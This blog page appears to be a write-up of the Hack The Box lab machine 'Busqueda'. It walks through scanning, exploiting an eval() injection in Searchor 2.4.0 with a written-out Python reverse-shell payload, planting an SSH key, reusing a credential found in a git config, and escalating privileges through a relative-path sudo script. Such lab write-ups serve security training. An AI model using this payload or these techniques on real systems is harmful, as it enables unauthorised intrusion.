<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Busqueda | chancej715</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Busqueda" />
<meta name="author" content="Chance Johnson" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="A relatively easy CTF by kavigihan on Hack The Box." />
<meta property="og:description" content="A relatively easy CTF by kavigihan on Hack The Box." />
<link rel="canonical" href="http://localhost:4000/writeups/2023-04-12-busqueda.html" />
<meta property="og:url" content="http://localhost:4000/writeups/2023-04-12-busqueda.html" />
<meta property="og:site_name" content="chancej715" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-04-12T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Busqueda" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Chance Johnson"},"dateModified":"2023-04-12T00:00:00-05:00","datePublished":"2023-04-12T00:00:00-05:00","description":"A relatively easy CTF by kavigihan on Hack The Box.","headline":"Busqueda","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2023-04-12-busqueda.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"Chance Johnson"},"url":"http://localhost:4000/writeups/2023-04-12-busqueda.html"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <link rel="stylesheet" href="/assets/css/bootstrap.min.css">

    <!--[if lt IE 9]>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
    <![endif]-->
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->

  </head>
  <body>
    <div class="wrapper">
      <header class="mb-5">
        
          <a href="https://chancej715.github.io"><img src="/assets/img/logo.png" alt="Logo" /></a>
        

        <p class="font-monospace mt-3 mb-0">chancej715</p>
        <p class="font-monospace mt-2 text-muted">Penetration Tester</p>
      
        <!-- Socials -->
        <a href="https://github.com/chancej715" target="_blank" style="text-decoration: none" class="social">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-github" viewBox="0 0 16 16">
            <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z"/>
          </svg>
        </a>

        <a href="https://linkedin.com/in/chancej715" target="_blank" style="text-decoration: none" class="social">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-linkedin" viewBox="0 0 16 16">
            <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z"/>
          </svg>
        </a>
        
        <a href="https://twitter.com/chancej715" target="_blank" style="text-decoration: none" class="social">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16">
            <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"/>
          </svg>
        </a>
      </header>
      <section>

      <h1>Busqueda</h1>
<p class="text-muted">2023-04-12</p>

<p class="view">Chance Johnson</p>

<p><a href="https://app.hackthebox.com/machines/Busqueda">Busqueda</a> by <a href="https://app.hackthebox.com/users/389926">kavigihan</a> on Hack The Box.</p>

<h1 id="enumeration">Enumeration</h1>
<p>I started with a usual Nmap scan to see what ports are open:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --min-rate 5000 10.10.11.208 
</code></pre></div></div>

<p>Output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<p>Looks like there’s an SSH and HTTP server running. Now to check the service versions:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p22,80 -sV 10.10.11.208
</code></pre></div></div>

<p>Output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<p>There’s an Apache server which I’m assuming is hosting serving web pages. I visited <code class="language-plaintext highlighter-rouge">http://10.10.11.208</code> in Firefox, however it seemed to be redirecting me to the domain <code class="language-plaintext highlighter-rouge">searcher.htb</code>. I added the following entry to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.208     searcher.htb
</code></pre></div></div>

<p>I reloaded the page in Firefox:
![[Screenshot from 2023-04-13 21-30-01.png]]</p>

<p>It seems to be a web page for the <a href="https://github.com/ArjunSharda/Searchor">Searchor</a> tool. At the bottom there is a field to enter a search query. I started off with a simple query:
![[Screenshot from 2023-04-13 21-34-34.png]]</p>

<p>After pressing “Search”, I was redirected to <code class="language-plaintext highlighter-rouge">http://searcher.htb/search</code>, which contained the following contents:
![[Screenshot from 2023-04-13 21-37-48 1.png]]</p>

<p>At this point, I wanted to find some more information about Searchor. The website’s footer indicates it’s running Searchor version 2.4.0. I navigated to the <a href="https://github.com/ArjunSharda/Searchor/tree/v2.4.0">Searchor 2.4.0 GitHub</a> page and began investigating.</p>

<p>In the <a href="https://github.com/ArjunSharda/Searchor/blob/v2.4.0/src/searchor/main.py#L32-L34">main.py</a> file, I noticed something very interesting:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">url</span> <span class="o">=</span> <span class="nf">eval</span><span class="p">(</span>
	<span class="sa">f</span><span class="s">"Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s">.search('</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s">', copy_url=</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s">, open_web=</span><span class="si">{</span><span class="nb">open</span><span class="si">}</span><span class="s">)"</span>
<span class="p">)</span>
</code></pre></div></div>

<p>Searchor uses Python’s <code class="language-plaintext highlighter-rouge">eval()</code> function to construct the URL. The <code class="language-plaintext highlighter-rouge">eval()</code> function in Python allows you to execute Python code from a given string. The web page on this box takes our input and uses it to craft the URL query. If you’re nervously sweating right now, that’s a good sign!</p>

<p>Read more about <code class="language-plaintext highlighter-rouge">eval()</code> [here](Read more about it <a href="https://www.codiga.io/blog/python-eval/">here</a>.</p>

<h1 id="foothold">Foothold</h1>
<p>Now it’s time to figure out how to exploit this unsafe coding practice to run some arbitrary code. Yay for RCE! I need to figure out a way to escale the <code class="language-plaintext highlighter-rouge">{query}</code> parameter in the following line:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sa">f</span><span class="s">"Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s">.search('</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s">', copy_url=</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s">, open_web=</span><span class="si">{</span><span class="nb">open</span><span class="si">}</span><span class="s">)"</span>
</code></pre></div></div>

<p>It’s surrounded by single quotes, so I started off by simply entering <code class="language-plaintext highlighter-rouge">' f</code> as my search query. This showed me a blank page, so my guess is that this lead to some kind of error or something like that. This is progress.</p>

<p>Now it’s time to get a reverse shell. I started a Netcat listener with <code class="language-plaintext highlighter-rouge">nc -lp 4444</code> and grabbed a Python reverse shell from <a href="revshells.com">here</a> and altered it slightly:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">',exec('</span><span class="kn">import</span> <span class="n">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="s">"10.10.1.1"</span><span class="p">,</span><span class="mi">4444</span><span class="p">));</span><span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="kn">import</span> <span class="n">pty</span><span class="p">;</span> <span class="n">pty</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span><span class="s">'))#
</span></code></pre></div></div>

<p>I entered this as my search query at the bottom of the <code class="language-plaintext highlighter-rouge">http://searcher.htb</code> page, and pressed “Search”. Now I have a reverse shell.</p>

<p>Before enumerating further, I wanted to establish an SSH connection if possible. I am currently logged in as the user <code class="language-plaintext highlighter-rouge">svc</code>, so I first created a directory <code class="language-plaintext highlighter-rouge">/home/svc/.ssh</code> and a new file called <code class="language-plaintext highlighter-rouge">authorized_keys</code> and added my public SSH key to this file. I then used this key to login: <code class="language-plaintext highlighter-rouge">ssh svc@searcher.htb -i id_rsa</code>.</p>

<h1 id="user">User</h1>
<p>The user flag was in <code class="language-plaintext highlighter-rouge">/home/svc/user.txt</code>.</p>

<h1 id="root">Root</h1>
<p>Time for some more enumeration. I navigated to <code class="language-plaintext highlighter-rouge">/var/www/app</code> which seemed to be the root directory for the website. In this directory I found a <code class="language-plaintext highlighter-rouge">.git</code> directory. In the <code class="language-plaintext highlighter-rouge">.git</code> directory was a file named <code class="language-plaintext highlighter-rouge">config</code> which contained the credentials <code class="language-plaintext highlighter-rouge">cody:jh1usoih2bkjaspwe92</code>.</p>

<p>I tried the classic <code class="language-plaintext highlighter-rouge">sudo -l</code> and was prompted for a password. I used the password that I just found, and it worked.</p>

<p>The output told me I was able to run the command <code class="language-plaintext highlighter-rouge">/usr/bin/python3 /opt/scripts/system-checkup.py *</code> as sudo.</p>

<p>I executed the following command:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
</code></pre></div></div>

<p>The following was printed to the terminal:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
</code></pre></div></div>

<p>In the original command, I replaced the <code class="language-plaintext highlighter-rouge">*</code> with <code class="language-plaintext highlighter-rouge">docker-ps</code>, <code class="language-plaintext highlighter-rouge">docker-inspect</code> and <code class="language-plaintext highlighter-rouge">full-checkup</code> and executed each in turn. The first two seemed to execute the commands <code class="language-plaintext highlighter-rouge">docker ps</code> and <code class="language-plaintext highlighter-rouge">docker inspect</code> respectively. The last one, <code class="language-plaintext highlighter-rouge">full-checkup</code>, seemed a bit strange. When I executed the command in the directory <code class="language-plaintext highlighter-rouge">/var/www/app</code>, it just printed <code class="language-plaintext highlighter-rouge">Something went wrong</code>. I navigated to <code class="language-plaintext highlighter-rouge">/opt/scripts/</code> to investigate.</p>

<p>In this directory, I found a file named <code class="language-plaintext highlighter-rouge">full-checkup.sh</code>. Is this the script that is executed when I use the <code class="language-plaintext highlighter-rouge">full-checkup</code> option in the original command? While in this directory, I executed the following command:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
</code></pre></div></div>

<p>And it worked! I got a lot of output about the Docker containers and some other processes. It looks like this script is being executed relative to the directory in which you execute the command. All that’s left to do now is create my own <code class="language-plaintext highlighter-rouge">full-checkup.sh</code> script.</p>

<p>I navigated back to <code class="language-plaintext highlighter-rouge">/home/svc/</code> and created a new file named <code class="language-plaintext highlighter-rouge">full-checkup.sh</code> with the following contents:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
cat /root/root.txt
</code></pre></div></div>

<p>I set the execute bit with <code class="language-plaintext highlighter-rouge">chmod +x full-checkup.sh</code> and again executed <code class="language-plaintext highlighter-rouge">sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</code>, and this time it printed out the root flag!</p>


      </section>
    </div>
    <script src="/assets/js/scale.fix.js"></script>
  </body>
</html>
